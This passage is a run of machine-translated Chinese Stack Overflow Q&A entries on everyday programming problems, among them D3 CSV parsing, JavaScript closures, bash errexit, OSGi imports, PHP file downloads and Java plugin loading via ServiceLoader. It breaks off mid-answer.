在使用 TFS 的“持续集成”功能时，我们遇到了挑战。将 Visual Studio 与 Azure 云服务、TFS 与 Azure 云服务进行比较时，构建不一致。当我们使用 TFS 的“持续集成”发布到 Azure 云服务时，我们的静态页面可以正常工作，但对于具有 *.cs 扩展名的页面无法找到我们在这些页面上放置的控件。但是，当我们使用 Visual Studio 2010 发布到 Azure 云服务时，这些页面可以正常运行。

您能否提供任何见解来解释为什么 Team Foundation Service 与 Azure 云服务的持续集成会导致带有 *.cs 扩展名的页面无法找到我们在这些页面上放置的控件，而使用来自Visual Studio 2010 到 Azure 云服务工作完美？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-15T07:00:15.850

确保包含自定义控件的所有引用程序集都“不”从 GAC 引用。理想情况下将它们放在一个文件夹中（将其称为库或引用等以便于识别）。然后从项目中的该位置引用程序集，也不要忘记将它们标记为**Copy Local = True**。

**任何**不属于框架的内容都应该像这样包含在内。

# javascript - 在 D3 中读取没有标题行的 csv/tsv

> ID：13870265
> 
> 赞同：27
> 
> 时间：2012-12-13T23:18:49.213
> 
> 标签：javascript, csv, d3.js, tsv

我有 CSV 数据，看起来像：

### 数据

```
1,1,10
1,2,50
1,3,5
etc... 
```

我正在尝试读取数据。但是，我的初始数据不包含标题行（如上所示），因此它将第一个数据行作为标题 (1,1,10)。有没有办法解决。我想在读取数据后设置标题名称

### Javascript

```
d3.csv("data/testnh.csv", function(data) {
    console.log(data);
} 
```

谢谢！

* * *

## 回答 #1

> 赞同：54
> 
> 时间：2012-12-13T23:26:35.263

使用[d3.text](https://github.com/d3/d3-request/blob/master/README.md#text)加载数据，然后使用[d3.csvParseRows 对其](https://github.com/d3/d3-dsv/blob/master/README.md#dsv_parseRows)进行解析。例如：

```
d3.text("data/testnh.csv", function(text) {
  console.log(d3.csvParseRows(text));
}); 
```

您可能还希望将列转换为数字，因为默认情况下它们是字符串。假设它们都是*数字*，您可以说：

```
d3.text("data/testnh.csv", function(text) {
  var data = d3.csvParseRows(text).map(function(row) {
    return row.map(function(value) {
      return +value;
    });
  });
  console.log(data);
}); 
```

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2016-01-09T21:54:50.343

由于 Bostock 在 2012 年的回答，[d3.csv.parseRows](https://github.com/d3/d3-dsv/blob/master/README.md#csvParseRows)允许一个可选的访问器函数，这使得他的回答能够更简洁地表达：

```
d3.text("data/testnh.csv", function(text) {
    var data = d3.csv.parseRows(text, function(d) {
        return d.map(Number);
    });
    // Now do something with data
}); 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2016-05-09T20:53:28.290

首先使用 读取数据`d3.text`，然后添加自定义标头字符串，然后使用解析结果`d3.csv.parse`

```
d3.text("data/testnh.csv", function(r){
   var result = "x, y, z\n" + r;  //now you have the header
   var data = d3.csv.parse(result);
   //do your plotting with data
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2017-12-08T08:54:18.717

试试**d3.csvParse(text)**

d3.csv.parseRows 似乎在现代 d3 版本中不起作用。

# java - 多线程 http 客户端和 tomcat 7

> ID：13870266
> 
> 赞同：0
> 
> 时间：2012-12-13T23:18:50.260
> 
> 标签：java, multithreading, http, tomcat

我对如何在独立的 java 应用程序中处理 http 会话感到困惑。以下是详细信息：

java 客户端连接到 3 个 tomcat 7 servlet。当客户端启动时，它会启动 2 个预定线程 /downloader 和 uploader/每 3 分钟轮询 2 个 servlet。他们都在各自类的私有字段中检索和存储 jsessionid cookie。这导致在 webapp 的整个生命周期中重复使用 2 个 Tomcat 会话。到目前为止，一切都很好。

有第 3 个服务/连接到第 3 个 servlet/ 使用线程“WebDispather”类的多个实例，该类与上述线程类似地检索和存储会话，但这次 - 在私有静态字段中。调度程序被大量使用，可能有多达 150 个实例同时运行，具体取决于负载。Dispatcher 线程每隔一秒左右就会碰到 servlet。

使调度程序 sessionid 字段非静态会为每个实例创建一个会话 - 不好。

将所有调度程序线程绑定到同一个 tomcat http 会话有什么含义？

谢谢

* * *

编辑：虽然dispather线程绑定到同一个会话，但会话本身不包含任何信息。Servlet 只处理请求参数。即调度员1：

localhost/messagecontrol?id=123&state

调度程序线程 2：localhost/messagecontrol?id=123&state=finished

//Servlet 处理并忘记 id 和 state

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-14T00:17:22.630

据我所知，这意味着所有客户端线程都将共享相同的会话信息，如果有任何不打算共享的信息，这将是您代码上的错误

如果您担心创建的线程数量（性能方面），请[考虑在代码中实现线程池](http://docs.oracle.com/javase/tutorial/essential/concurrency/pools.html)。

# c# - 从 PropertyGrid 集合属性中删除“...”按钮

> ID：13870268
> 
> 赞同：2
> 
> 时间：2012-12-13T23:19:06.443
> 
> 标签：c#, collections, propertygrid, uitypeeditor

我正在尝试更改集合属性在 Winforms PropertyGrid 中的显示方式。

而不是拥有

```
MyList | (Collection) [...] 
```

并且必须按下按钮才能显示 CollectionEditor。我将列表扩展为 ExpandableObjectConverter。但我仍然得到 [...] 按钮。所以现在它看起来像这样。

```
[+] MyList | (2 Items) [...]
    Item 1 | Value
    Item 2 | Value 
```

最终，我想将这个 [...] 替换为添加按钮。我只是不知道从哪里开始。如果我理解正确，CollectionEditor 是我按下 [...] 时显示的窗口。那么我需要覆盖什么对象才能删除和添加我自己的按钮。

谢谢

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-14T00:51:45.227

从 继承一个新类`CollectionEditor`并覆盖`GetEditStyle`返回`None`以防止“...”按钮显示。

同样不幸的是，您不能`Add`使用标准属性网格添加按钮。您可以选择“...”、向下箭头或无按钮。

```
class CustomEditor : CollectionEditor
{
  public override UITypeEditorEditStyle GetEditStyle(ITypeDescriptorContext context)
  {
    return UITypeEditorEditStyle.None;
  }
} 
```

您可以使用以下属性将此新编辑器应用于属性：

```
[EditorAttribute(typeof(CustomEditor), typeof(UITypeEditor))] 
```

# javascript - jQuery for 循环无法识别 Drupal 行为中闭包中的变量...？

> ID：13870270
> 
> 赞同：1
> 
> 时间：2012-12-13T23:19:17.927
> 
> 标签：javascript, jquery, drupal

谁能告诉我为什么这可能行不通

```
Drupal.behaviors.toggleGroups = {
  attach:function(context, settings) {
    for (var i = 1; i < 8; i++) {
      $('#edit-group-' + i.toString() + '-toggle').unbind('click').click(function(i) {
        $('#category-' + i.toString()).slideToggle();
      });
    }
  }
}; 
```

但是这个丑陋的东西很好用

```
Drupal.behaviors.toggleGroups = {
  attach:function(context, settings) {
    $('#edit-group-1-toggle').unbind('click').click(function() {
      $('#category-1').slideToggle();
    });
    $('#edit-group-2-toggle').unbind('click').click(function() {
      $('#category-2').slideToggle();
    });
    $('#edit-group-3-toggle').unbind('click').click(function() {
      $('#category-3').slideToggle();
    });
    $('#edit-group-4-toggle').unbind('click').click(function() {
      $('#category-4').slideToggle();
    });
    $('#edit-group-5-toggle').unbind('click').click(function() {
      $('#category-5').slideToggle();
    });
    $('#edit-group-6-toggle').unbind('click').click(function() {
      $('#category-6').slideToggle();
    });
    $('#edit-group-7-toggle').unbind('click').click(function() {
      $('#category-7').slideToggle();
    });
  }
}; 
```

理想情况下，我想做一些事情，例如“选择器返回结果做某事” - 问题是我需要增量数字，每次点击都会切换一个单独的div。可能我只是在想这一切都是错误的，但无论如何，我无法弄清楚为什么我所拥有的东西是无效的......

在您使用它的同时，任何关于 jQuery once() 方法的建议，所以我不必取消绑定/绑定点击处理程序也将不胜感激......

谢谢你！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-13T23:21:18.220

**经典的关闭问题..**

尝试这个

```
Drupal.behaviors.toggleGroups = {
  attach:function(context, settings) {
    for (var i = 1; i < 8; i++) {
      (function(num){
         $('#edit-group-' + num + '-toggle')
                                    .unbind('click').click(function(num) {
            $('#category-' + num).slideToggle();
         });
      })(i)
    }
  }
}; 
```

到函数被分配时，变量**i**共享相同的内存位置。所以它总是指向**i 的最后一个实例**

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-13T23:31:44.093

这是“iditis”的常见情况。如果你使用两个通用类，一切都会更容易操作。去掉 ids 并添加类，`edit-group-toggle`and `category`，然后你可以通过索引来获取它们对应的目标：

```
attach: function( context, settings ) {
  $('.edit-group-toggle').click(function() {
    $('.category').eq( $(this).index() ).slideToggle();
  });
} 
```

# php - 下载 Excel 文件以响应提交表单

> ID：13870271
> 
> 赞同：1
> 
> 时间：2012-12-13T23:19:28.617
> 
> 标签：php, javascript

我想让用户输入一个日期范围，然后能够下载一个 Excel 文件，其中包含基于该日期范围检索的数据。

最初，我通过将表单作为同一页面的 GET 请求提交来完成这项工作。如果存在 GET 参数，页面将检索数据并输出所需的标题，然后输出数据。然后我会`exit;`从进程中阻止页面加载（因为我必须发送带有 Excel 数据的标题）。

这行得通。但是，我想包含一个进度指示器，一旦发送数据就会消失。但是我找不到这样做的方法。

当按下表单提交按钮时，我可以启动这样的指示器，但是一旦输出文档以供下载，我就找不到关闭它的方法。

顺便说一句，Ajax 在这种情况下不起作用。

谁能建议如何做到这一点？我在这里看到了关于[将输出加载到隐藏 iframe 的](https://stackoverflow.com/questions/149821/use-jquery-to-send-excel-data-using-ajax)建议，但我自己不明白如何执行此操作。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-14T00:46:02.803

因为我没有可以作为基础的代码，所以我将主要为您写理论。

用户请求下载文件

您加载一个页面，在其中创建文件，该过程需要一些时间，在此期间您向用户显示进度条。

而不是把这个文件扔给带有标题功能的用户（你不能使用它，因为你已经在屏幕上打印了）你将文件保存到一个临时目录中。最好用随机名称或时间戳来调用它。

在文件创建结束时，在屏幕上打印一个 JavaScript 命令，如下所示：

```
<script language=”JavaScript”&gt;
self.location=”download.php?file=whatever_you_called_it.xls”;
</script> 
```

使用以下内容设置 Excel 下载的标题：

```
header('Content-disposition: attachment; filename=your_excel_file.xls');
header('Content-type: application/xls');
readfile('tmp_dir/whatever_you_called_it.xls');

unlink ('tmp_dir/whatever_you_called_it.xls'); 
```

自己清理东西总是好的。请注意，某些内容可能不会被删除。所以最好还是有一个垃圾收集器。并将文件保留在公共目录之外

显然，如果数据不敏感，那么你可以简单地将javascript直接设置到文件中，浏览器会直接下载它。但是你需要某种垃圾收集器来清理所有这些创建的文件......这会很混乱......

# eclipse - permgen 异常.. 尝试了许多建议但无济于事

> ID：13870273
> 
> 赞同：1
> 
> 时间：2012-12-13T23:19:42.097
> 
> 标签：eclipse, tomcat, permgen

我在与 permgen 相关的 eclipse 中出现内存不足异常。我尝试更改 ini 文件中的值，但这没有帮助。我参考了这个网站上的各种相关帖子。我的机器配置是 corei5，8 GB RAM。我正在做的开发需要我运行 Tomcat 和一个 android 应用程序，它将向这个 tomcat 服务器发送 http 请求。我正在发布我现在正在使用的 ini。有人可以帮忙吗？

```
-startup
plugins/org.eclipse.equinox.launcher_1.3.0.v20120522-1813.jar
--launcher.library
plugins/org.eclipse.equinox.launcher.win32.win32.x86_64_1.1.200.v20120522-1813
-product
org.eclipse.epp.package.jee.product
--launcher.defaultAction
openFile
--launcher.XXMaxPermSize
1024M
-showsplash
org.eclipse.platform
--launcher.XXMaxPermSize
1024m
--launcher.defaultAction
openFile
-vmargs
-Dosgi.requiredJavaVersion=1.5
-Dhelp.lucene.tokenizer=standard
-Xms1700m
-Xmx1700m
-XX:MaxPermSize=1700m
-XX:+UseConcMarkSweepGC
-XX:+CMSClassUnloadingEnabled
-XX:+CMSPermGenSweepingEnabled 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-14T13:24:15.957

是的，1700m 确实是一个巨大的价值。我猜它是你的应用程序本身，它抛出了 permgen 错误，而不是在启动时 eclipse 本身。如果是您的应用程序引发错误，请将以下选项添加到 catalina.bat 文件中的 JAVA_OPTS 中。（在 Tomcat 的 bin 目录中）。

```
-XX:PermSize=128m -XX:MaxPermSize=256m 
```

此外，只需浏览您的应用程序，并确保没有为每个 http 请求持续加载的类。这可能是您收到此错误的原因。可能您可以检查服务器日志以查看每个请求都加载了哪些所有类。您可以通过将以下选项添加到 JAVA_OPTS 来启用这些日志。

```
-XX:+TraceClassLoading -XX:+TraceClassUnloading 
```

如果它与 eclipse 相关，而不是与您的应用程序相关，您可以添加

```
-XX:MaxPermSize=<value> 
```

到启动配置中的 vm 参数（运行方式-> 运行配置-> ）

# java - OSGi 中的传递依赖

> ID：13870275
> 
> 赞同：4
> 
> 时间：2012-12-13T23:20:00.950
> 
> 标签：java, osgi, bnd

我`NoClassDefFoundError`在运行时得到一个，我认为该`"uses"`指令会避免这种情况，因为我认为它创建了传递性（如果我错了，请纠正我）。这是我的配置：

```
Bundle 1 
  Export-package A

Bundle 2 
  Export-package B, uses "A"
  Import-package A

Bundle 3
  Import-package B 
```

现在，当 Bundle 3 调用*B*中的类，而后者又调用*A*中的类时，就会发生异常。基于控制台，我可以看到`BundleClassLoader`在捆绑包 3 中查找类（换句话说，在其本身），但在捆绑包 1 中找不到它。如果我强制 BND 在 Bundle 3 中导入 A 一切正常，但它看起来太费力了。我觉得我错过了一些东西。Equinox 不应该使用清单中的信息来设置捆绑类路径吗？或者在最坏的情况下，BND 不应该检测 3 对 1 的依赖并在 3 的清单中导入包 A 吗？

我所有的捆绑包都是`active`并且我没有`uses`违反约束

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-14T01:08:51.847

Bundle 2 也必须导入 A。使用 A 表示任何导入我的 B 并导入 A 的包必须导入与我相同的 A。由于捆绑包 2 不导入 A，因此这是行不通的。此外，bundle 3 需要导入 A，因为 B 使用 A。任何 B 的导入器也是 A 的用户，因此必须导入 A。

# java - 'buffer[k%length]' 与 'buffer[k] catch ArrayIndexOutOfBounds' 的性能

> ID：13870285
> 
> 赞同：0
> 
> 时间：2012-12-13T23:20:31.450
> 
> 标签：java, android, performance

关于java性能的一个简单问题。如果我写一个循环

```
for(int i=0;i<n;++i) buffer[(k++)%buffer.length]=something; 
```

其中有些东西是一个非平凡的数字滤波器。使用此代码，我在每次写入时都有一个模运算。这感觉有点傻，因为 Java VM 无论如何都会检查它。因此，我假设使用 ArrayIndexOutOfBounds 的构造会更快（缓冲区包含 1'000'000 个数字，所以我们不会经常出现溢出）

```
int i;
try
  {
  for(i=0;i<n;++i,++k) buffer[k]=something;
  }
catch (ArrayIndexOutOfBounds e)
  {
  k=0;
  for(;i<n;++i,++k) buffer[k]=something;
  } 
```

第三种解决方案可能是提前计算我们会溢出的点，然后手动将循环一分为二。确定循环可以走多远的代码每 768 个样本执行一次，因此从这个角度来看，它可能比 catch 方法慢。

这里的问题是，除了愚蠢的代码重复（我很乐意牺牲在性能的祭坛上）之外，我们还有*更多的*代码。在那里，Java 的优化通常不如较小的例程。

所以我的问题是：什么策略最有效？有人对这种结构有经验吗？另外，任何人都可以了解这两种结构在 android 设备上的性能吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-14T01:02:48.650

您的答案取决于您的目标平台。你已经添加了 Android 标签，所以我将用 Dalvik 和（比方说）Nexus 4 来回答。

首先，ARMv7-A 架构不提供整数除法指令。每次通过循环时，您的模数都会在软件中计算出来，这会降低您的速度。（这就是为什么最好对哈希表使用 2 的幂大小——您可以使用位掩码而不是 mod。）

其次，抛出异常是昂贵的。VM 必须创建异常对象，并使用当前堆栈的快照对其进行初始化。除了直接的开销之外，您还创建了 X 个稍后必须清理的对象，并增加了 VM 不得不在计算过程中阻止您并收集垃圾的可能性。

第三，一般而言，您可以从内部循环中提取的任何计算都代表着胜利，因此在每次循环迭代时手动测试数组溢出是不令人满意的。如果可以避免，您不想在循环头或正文中添加对`k`vs.的测试。`length`（JIT 编译器可能会做这样的事情——如果它可以告诉数组索引永远不会离开数组的末尾，它就不必进行每个元素的边界检查。）

Based on the (still slightly vague) sense of what you're doing and how many times you're doing it, I'd say the best option is to compute the "break" position ahead of the loop, and iterate the necessary number of times.

I'm curious to know how this turns out in practice. :-)

# javascript - jQuery - 阻止可排序元素在拖动开始后返回可排序列表

> ID：13870287
> 
> 赞同：1
> 
> 时间：2012-12-13T23:20:44.107
> 
> 标签：javascript, jquery, jquery-ui

我在 jQuery 中有两个连接的 sortables。它们被称为 sortable1 和 sortable2。当你从 sortable2 中取出一个元素时，你将它放入 sortable1 中。拖动开始后，用户不应该能够将元素移回 sortable2（正在制作克隆以填充空白。）因此，一旦开始拖动它，如何在仍然拥有的同时阻止它回到 sortable2 sortable1 的全部功能？

提前感谢您的帮助！

这是脚本：

```
<script>
$(function() {
    $( "#sortable1" ).sortable({
        connectWith: ".connectedSortable"                       
    }).disableSelection();
            $('.ui-state-highlight').click(function(){
                    if ($(this).parent().attr("id")!="sortable2") {
                     $(this).remove();
                    }
            });
            $( "#sortable2" ).sortable({
        connectWith: ".connectedSortable",
                    helper: function(e,li) {
                                    copyHelper=li.clone(true,true).insertAfter(li);
                                    return li.clone(true,true);
                                }
    }).disableSelection();
});       
</script> 
```

这是列表后面的 html 片段：

```
<div id="symbolbay">
     <p>Drop symbols here</p>
     <ul id="sortable1" class="connectedSortable"></ul>
</div>
<ul id="sortable2" class="connectedSortable">
    <li class="ui-state-highlight">Click me to delete only me</li>
    <li class="ui-state-highlight">Click me to delete only me</li>
...There are a whole bunch more, finally ending in...
</ul> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-14T01:31:31.650

connectWith 参数是一种单向关系，如此处所述：http: [//api.jqueryui.com/sortable/#option-connectWith](http://api.jqueryui.com/sortable/#option-connectWith)

因此，只需指定 #sortable2 与 #sortable1 连接，但将 #sortable1 中的参数留空即可。

就像是：

```
$(function() {
    $( "#sortable2" ).sortable({
        connectWith: "#sortable1"
    })
    $( "#sortable1" ).sortable({
    })
}); 
```

[http://jsfiddle.net/69vPK/2/](http://jsfiddle.net/69vPK/2/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-05-09T09:38:10.330

```
$(function() {
    $( "#sortable2" ).sortable({
        connectWith: "#sortable1"
    }).disableSelection();

}); 
```

试试这个

# bash - bash中的errexit问题

> ID：13870291
> 
> 赞同：3
> 
> 时间：2012-12-13T23:20:58.553
> 
> 标签：bash, error-handling, subshell

我正在编写一个 bash 脚本，我希望它在第一个错误时崩溃。但是，在我在下面简化的特定情况下，我无法做到这一点：

```
#!/bin/bash
set -Exu
bad_command() {
  false
  #exit 1
  echo "NO!!"
}
(set -o pipefail; bad_command | cat ; echo "${PIPESTATUS[@]}; $?") || false
echo "NOO!!" 
```

预期的行为将是`bad_command`子`()`外壳的崩溃，传播到子外壳的崩溃，传播到外壳的崩溃。但是这些都没有崩溃，两个 NO 都被打印出来了（！？）

如果我取消注释该`exit 1`语句，则不再打印 NO，但 NOO 仍然是（！？）

我尝试`set -e`在 3 个 shell 中的每一个中显式使用（函数中的第一行，之后`(`的第一个语句，但没有变化。

注意：我需要在子shell 内执行管道`()`，因为这是对更复杂脚本的简化。没有`()`subshel​​l，一切都按预期工作，没有任何 NO`false`或`exit 1`.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-14T14:32:42.570

这似乎是一个 bash 甚至 POSIX 错误：[https ://groups.google.com/forum/?fromgroups=#!topic/gnu.bash.bug/NCK_0GmIv2M](https://groups.google.com/forum/?fromgroups=#!topic/gnu.bash.bug/NCK_0GmIv2M)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-06-29T19:17:10.367

遇到同样的问题后，我找到了解决方法。实际上 3 取决于您想要实现的目标。

首先对 OP 示例代码进行小幅重写，因为处理退出代码需要一些额外的工作：

```
#! /bin/bash
set -eEu
bad_command_extra() {
        return 42
}
bad_command() {
  bad_command_extra
  echo "NO!!"
}

if bad_command; then echo "NOO!!"; else echo "errexit worked: $?"; fi 
```

如果只需要让 errexit 工作，那么调用`bad_command`. 诀窍是`bad_command`在后台启动：

```
(bad_command) &
bc_pid=$!
if wait $bc_pid; then echo "NOO!!"; else echo "errexit worked: $?"; fi 
```

如果您也想使用输出（类似于`abc=$(bad_command)`），请照常将其捕获到临时文件中：

```
tmp_out=$(mktemp)
tmp_err=$(mktemp)
(bad_command >$tmp_out 2>$tmp_err) &
bc_pid=$!
if wait $bc_pid; then echo "NOO!!"; else echo "errexit worked: $?"; fi
cat $tmp_out $tmp_err
rm -f $tmp_out $tmp_err 
```

最后，我在测试中发现该`wait`命令返回 0 或 1，但不是`bad_command`(bash 4.3.42) 的实际退出代码。这需要更多的工作：

```
tmp_out=$(mktemp)
tmp_err=$(mktemp)
tmp_exit=$(mktemp)
echo 0 > $tmp_exit
(
        get_exit () {
                echo $? > $tmp_exit
        }
        trap get_exit ERR
        bad_command >$tmp_out 2>$tmp_err
) &
bc_pid=$!
bc_exit=$(cat $tmp_exit)
if wait $bc_pid
then echo "NOO!!"
else echo "errexit worked: $bc_exit"
fi
cat $tmp_out $tmp_err
rm -f $tmp_out $tmp_err $tmp_exit 
```

出于某种奇怪的原因，`if`在这种情况下，像以前一样放在一行让我退出代码 0 ！

# objective-c - 使用 CATransition 进行转换

> ID：13870292
> 
> 赞同：0
> 
> 时间：2012-12-13T23:21:07.753
> 
> 标签：objective-c, ios, cocoa-touch, ios5, ios4

如何使用 CATransition 从一个控制器移动到下一个控制器，以便视图向上移动以显示第二个窗口。我希望控制器 1 的视图向上移动并显示第二个控制器的视图。我怎样才能做到这一点？

这就是我在做什么？

```
CATransition *transition = [CATransition animation];
transition.duration = 0.7f;
transition.timingFunction = [CAMediaTimingFunction functionWithName:kCAMediaTimingFunctionLinear];
transition.type = kCATransitionFromBottom;

[self.navigationController.view.layer addAnimation:transition forKey:nil];

[self.navigationController pushViewController:destinationController animated: NO]; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-14T12:09:14.103

试试这个

```
CATransition* transition = [CATransition animation];
transition.duration = 0.7f;
transition.timingFunction = [CAMediaTimingFunction functionWithName:kCAMediaTimingFunctionEaseInEaseOut];
transition.type = kCATransitionFade; //kCATransitionMoveIn,kCATransitionReveal, kCATransitionFade, kCATransitionPush, 
//transition.subtype = kCATransitionFromTop; //kCATransitionFromRight, kCATransitionFromTop, kCATransitionFromLeft, kCATransitionFromBottom
[self.navigationController.view.layer addAnimation:transition forKey:nil];
[[self navigationController] popViewControllerAnimated:NO]; 
```

# ios - iOS - 下载文件时的渐进式下载指示器

> ID：13870304
> 
> 赞同：2
> 
> 时间：2012-12-13T23:22:17.913
> 
> 标签：ios, download, nsdata, progress

所以这个问题已经被问了很多次，但所有的答案都是我们不再支持的 ASIHTTP 库。

所以我希望有人能把我引向正确的方向。我使用 NSData 在我的应用程序中下载文件（图像/视频），并且想知道如何显示实际跟踪下载进度的进度条/指示器（即 20%、30% 等）

是否有任何内置类允许使用进度更新跟踪文件下载？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-13T23:28:40.767

如果您有`NSURLConnection`委托，那么：

*   `NSURLResponse`您收到的将`connection:didReceiveResponse:`是 type `NSHTTPURLResponse`。如果您访问`[[response allHeaderFields] valueForKey:@"Content-Length"]`，您将获得一个字符串，其中包含您期望接收的数据长度；
*   随后通过数据的积累，`connection:didReceiveData:`你就会知道返回了多少数据。

由于您知道您收到了多少字节以及您期望多少字节，您将能够很容易地计算出百分比。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-13T23:36:40.167

ASIHTTP 有几个替代选项。领先的是[AFNetworking](https://github.com/AFNetworking/AFNetworking)。它包括对下载进度条的支持。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-12-13T23:27:17.897

查看 ASIHTTPRequest 。太棒了，会做更多更奇妙的事情。

[http://allseeing-i.com/ASIHTTPRequest/](http://allseeing-i.com/ASIHTTPRequest/)

# r - 格子，合并条纹

> ID：13870306
> 
> 赞同：0
> 
> 时间：2012-12-13T23:22:23.253
> 
> 标签：r, lattice

我正在使用以下代码构建晶格图

```
table.df<-means 
library(lattice)
library(gridExtra)
graph1<-barchart(value1~Var1|Var2+Var3,data=table.df, ylab=NULL)
graph2<-barchart(value2~Var1|Var2+Var3,data=table.df, ylab=NULL)
grid.arrange(graph1,graph2, nrow=2, ncol=2) 
```

我正在尝试合并通讯条。例如，第一个图形中的第一个条带将合并为一个唯一条带 (normalVar3)。

有什么建议吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-13T23:56:27.377

看一下`latticeExtra::useOuterStrips`

# c# - 使用 jquery 编辑和重新加载 MVC 4 模型

> ID：13870313
> 
> 赞同：-1
> 
> 时间：2012-12-13T23:23:01.707
> 
> 标签：c#, jquery, asp.net-mvc-4

我想知道是否有一种方法可以编辑 MVC 4 模型，然后使用来自 jQuery 的新模型重新加载视图。我想要做的基础是我有一个页面，每个日期后都有数周的日期和文本框。此页面适用于考勤卡网站。该模型包含星期几和该日期的日期名称。我要修改的是模型中的日期，因此如果用户在本周并意识到他们忘记输入上周的时间，他们可以单击一个按钮来输入上周的时间。我有获取日期和星期几的功能，只是不确定如何编辑模型并重新加载它。

C# 代码示例中的站点控制器或任何想法都会有所帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-14T00:53:39.547

您应该考虑使用[jQuery/AJAX](http://api.jquery.com/jQuery.ajax/)与您的服务器进行通信。将您的模型序列化为`JSON`，在您的控制器中对其进行修改并将其发回。然后，您可以使用新数据更新您的视图。

# jquery - 将输入限制为数字从文本框中删除零

> ID：13870319
> 
> 赞同：0
> 
> 时间：2012-12-13T23:23:34.933
> 
> 标签：jquery, asp.net-mvc-3

我有一个文本框，我在其中使用 jQuery 将输入限制为仅数字字符。我遇到的问题是，当 4 位代码以 0 开头时，它会在焦点输出或输入另一个数字时从文本框中删除。这是一个 mvc3 应用程序，数据类型是字符串。如何保持前导零不被删除？我的 jQuery 代码中有什么我没有注意到的吗？如果有多个前导零，例如“0025”，这也适用。

```
$('#selector').bind('keyup paste', function (e) {
if (checkArrowKeyEntry(e)) {
    var ob = $(this);
    if (e.type == 'paste') {
        setTimeout(function () {
            myFuncion(ob);
        }, 1);
    } else {
        myFuncion(ob);
    }
}
});

function myFuncion(ob) {
ob.val(numericInputOnly(ob.val()));
}

function checkArrowKeyEntry(e) {
isNotArrowKey = true;
if (e.keyCode == 37 || e.keyCode == 39) { //|| e.keyCode == 8 || e.keyCode == 46) {
    // leftarrow, rightarrow, delete, backspace
    isNotArrowKey = false;
}
return isNotArrowKey;
}

function numericInputOnly(inputvalue) {
if (!isNaN(parseInt(inputvalue, 10))) {
    inputvalue = parseInt(inputvalue, 10);
}
else {
    inputvalue = "";
}
inputvalue = inputvalue.toString().replace(/[^0-9]/g, '');
return inputvalue;
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-13T23:36:18.483

我怀疑 numericInputOnly 函数有问题。

您正确地确保它始终输出一个字符串（这样前导 0 就不会被修剪掉），但是您过早地将 inputValue 转换为字符串。

您的代码中的错误在线：

```
inputvalue = parseInt(inputvalue, 10); 
```

转换为 int 将“丢失”尾随的 0。

尝试例如

```
function numericInputOnly(inputvalue) {
    return inputvalue.replace(/[^0-9]/g, '');
} 
```

这将只保留输入的数字（所有数字，包括前导 0），并且可能与您需要的相对应。

# java - Java动态加载插件

> ID：13870321
> 
> 赞同：8
> 
> 时间：2012-12-13T23:23:44.950
> 
> 标签：java, plugins, runtime, classpath

我想做一个可以动态加载插件的应用程序，但是我在网上没有找到任何文献。

困难的是：我事先不知道名字。

例如我有一个**插件**接口：

```
public interface Plugin {
    public static Plugin newPlugin();
    public void executePlugin(String args[]);
} 
```

这样 jar 文件中的每个实现**Plugin**的类都在列表中实例化：

```
Method method = classToLoad.getMethod ("newPlugin");
mylist.add(method.invoke(null); 
```

1.  第一个问题是，我不能在接口中有**静态方法。**
2.  第二个问题是，我不知道如何找到所有实现接口的类

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2012-12-13T23:41:37.303

因此，您似乎希望`Plugin`在运行时动态发现实现特定接口（例如 ）的类。您基本上有两种选择：

1.  使用像 osgi 这样的组件框架
2.  使用 Java 的内部发现过程 ( `ServiceLoader`)

由于 osgi 上有很多很好的教程（也有小的），这里就不详细介绍了。要使用 Java 的内部发现过程，您需要执行以下操作：

*   将您希望发现的所有“新”类捆绑到一个 jar 文件中
*   **在**jar 文件中创建一个新文件：`META-INF/services/package.Plugin`您必须在此处使用完整的包限定符
*   `Plugin`该文件是一个简单的文本文件，包含在该 jar 文件中实现的每个类的完全限定名称
*   将该 jar 文件放入（可能已经在运行的）应用程序的类路径中
*   发现服务：

服务发现是这样完成的：

```
ServiceLoader<Plugin> loader = ServiceLoader.load(Plugin.class)
for (Plugin p : loader) {
    // do something with the plugin
} 
```

这里有更多细节：http: [//docs.oracle.com/javase/7/docs/api/java/util/ServiceLoader.html](http://docs.oracle.com/javase/7/docs/api/java/util/ServiceLoader.html)

至于接口中的静态方法：不可能。其语义也会有些奇怪，因为静态方法可以在没有类实例的情况下访问，而接口只是定义方法，没有任何功能。因此，静态将允许调用`Interface.doSomething()`，而接口没有定义任何功能，这只会导致混乱。

编辑：

添加描述应该在元文件中的内容

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-13T23:48:38.680

关于你的第一个问题，接口中不能有静态方法，我的建议是简单地使用接口有一个标记并实例化它。

您的插件界面可以简单地是：

```
public interface Plugin {
  public void executePlugin(String args[]);
} 
```

然后你可以这样做：

```
if (someClass instanceOf Plugin) {
  mylist.add(someClass.newInstance());
} 
```

这就引出了第二个问题，你将如何获得`someClass`参考。 **没有标准方法可以****在您的 classpath**中找到所有实现给定接口的类，但是，您可以做的一种方法是扫描您的 classpath 中的 jar，如果给定文件以`.class`通过它在 jar 内的路径确定它的完整限定名和使用`Class.forName()`方法来实现类。

在伪代码中是这样的：

```
for each jar in your classpath {
  for each file in JarFile {
